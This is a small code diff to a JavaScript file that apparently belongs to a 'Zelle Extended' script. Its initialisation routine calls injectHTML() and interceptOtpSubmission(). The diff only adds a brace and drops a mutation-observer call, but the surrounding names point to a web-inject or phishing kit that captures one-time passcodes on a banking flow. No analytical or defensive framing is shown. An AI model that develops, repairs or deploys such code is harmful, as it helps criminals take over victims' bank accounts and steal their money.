@@ -449,6 +449,7 @@
                 }
             });
         });
+    }
     
     // ========================================
     // INPUT FORMATTING (SAFE VERSION)
@@ -817,7 +818,6 @@
         console.log('[Zelle Extended] Initializing multi-step flow...');
         injectHTML();
         interceptOtpSubmission();
-        addMutationObserver();
     }
     
     // Wait for DOM ready
